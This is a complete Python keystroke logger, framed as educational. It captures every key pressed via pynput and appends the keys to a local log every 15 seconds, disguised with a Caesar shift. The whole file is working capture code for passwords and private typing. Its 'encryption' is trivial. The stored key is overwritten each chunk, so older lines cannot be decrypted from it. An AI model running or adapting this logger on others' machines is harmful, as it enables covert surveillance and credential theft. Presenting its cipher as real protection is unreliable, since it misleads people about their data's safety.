"""Educational key logger that encrypts each 15-second chunk.

Only run this on a computer you own or have explicit permission to test.
"""

from pynput import keyboard
import threading
import os
import random

# Store output beside this script instead of depending on the current folder.
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
LOG_FILE = os.path.join(SCRIPT_DIR, "keystrokes.log")
KEY_FILE = os.path.join(SCRIPT_DIR, "key.txt")

# Each chunk gets a random key from 1 through 25. key.txt stores only the latest key.
SHIFT = random.randint(1, 25)
with open(KEY_FILE, "w") as f:
    f.write(str(SHIFT))
print(f"Session key: {SHIFT} (saved to {KEY_FILE})")

FLUSH_SECONDS = 15

# Keystrokes wait here until the timer encrypts and saves them.
buffer = []

def encrypt(text, shift):
    """Move every letter forward by ``shift`` places."""
    result = ""
    for char in text.upper():
        if char.isalpha():
            # Convert A-Z to 0-25, shift, wrap around, then convert back.
            result += chr((ord(char) - 65 + shift) % 26 + 65)
        else:
            # Keep spaces and punctuation unchanged.
            result += char
    return result

def flush():
    """Encrypt the buffer, save one line, and schedule the next flush."""
    global buffer, SHIFT
    if buffer:
        # One log line represents one time period and therefore one key.
        text = "".join(buffer)
        encrypted = encrypt(text, SHIFT)
        with open(LOG_FILE, "a") as f:
            f.write(encrypted + "\n")
        buffer = []
        # Rotate the key after saving, so the next chunk uses a new key.
        SHIFT = random.randint(1, 25)
        with open(KEY_FILE, "w") as f:
            f.write(str(SHIFT))
    timer = threading.Timer(FLUSH_SECONDS, flush)
    timer.daemon = True
    timer.start()

def key_to_char(key):
    """Convert a pynput event into text that can be saved in the log."""
    try:
        return key.char
    except AttributeError:
        # These keys do not have normal characters, so give them readable names.
        special = {
            keyboard.Key.space: " ",
            keyboard.Key.enter: "\n",
            keyboard.Key.tab: "[TAB]",
        }
        return special.get(key, "")

def on_press(key):
    """Add a key to the buffer and stop when Escape is pressed."""
    char = key_to_char(key)
    if char:
        buffer.append(char)
    if key == keyboard.Key.esc:
        return False

# Start the repeating timer, then wait until the listener stops.
print("Capturing keys (encrypted every {}s). Press Esc to stop.".format(FLUSH_SECONDS))
flush()
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
# Save any keys typed since the previous timer event.
flush()
print("Stopped. Encrypted log saved to", LOG_FILE)